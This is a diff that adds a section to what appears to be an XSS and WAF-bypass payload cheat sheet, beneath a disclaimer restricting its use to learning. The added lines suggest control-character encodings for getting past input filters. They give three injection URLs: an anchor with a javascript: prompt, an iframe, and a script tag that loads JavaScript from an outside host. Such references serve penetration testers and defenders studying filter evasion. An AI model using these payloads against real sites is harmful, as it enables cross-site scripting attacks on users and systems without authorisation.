@@ -9,6 +9,15 @@ You shall not misuse the information to gain unauthorized access and/or write ma
 
 These information shall only be used to expand knowledge and not for causing malicious or damaging attacks.
 
+Able to inject script, iframe, anchor but something is parsing your input?
+==============
+%0A,%1A,%0B,%1B,%0C,%1C,%0D,%1D,%0E,%1E,%0F,%1F may be able to help you
+```html
+http://yourhost/blah?Parameter="><a href="%0F%1Fjavascript:prompt(123)">asdf
+http://yourhost/blah?Parameter="><iframe src="%0F%1Fhttps://www.aswsec.com/"></iframe>
+http://yourhost/blah?Parameter="><script src="%0B%1Fhttps://www.aswsec.com/pen-test/simple.js"></script>
+```
+
 Did you break out of a tag and script, iframe, img, a, etc are all blocked by the WAF?
 ==============
 
